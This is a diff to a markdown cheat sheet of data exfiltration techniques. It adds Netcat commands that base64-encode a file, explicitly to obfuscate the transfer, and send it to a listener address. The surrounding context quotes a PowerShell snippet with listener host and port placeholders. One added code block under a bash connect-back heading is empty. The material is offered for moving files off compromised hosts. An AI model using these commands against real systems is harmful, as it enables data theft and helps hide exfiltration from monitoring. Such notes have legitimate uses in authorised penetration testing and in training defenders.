@@ -2,6 +2,7 @@
 #### This is a list of some data exfiltration techniques if you don't have access to SCP, FTP, SMB, etc.
 
 ***
+***
 
 ### Windows To Linux
 
@@ -38,6 +39,7 @@ $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPo
 
 ###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
 
+***
 ***
 
 ### Linux To Linux
@@ -100,6 +102,26 @@ nc -q 0 -lp %ListenerPort% < file.ext
 
 ```
 nc %ListenerAddress% %ListeningPort% > file.ext
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:
+
+```
+
+```
+
+##### If you want to obfuscate the data being transfered by converting it to a base64 string:
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
+
+```
+base64 -w0 file.ext | nc -q 0 -lp %ListeningPort%
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:
+
+```
+nc %ListenerAddress% %ListeningPort% | base64 -d > file.ext
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:
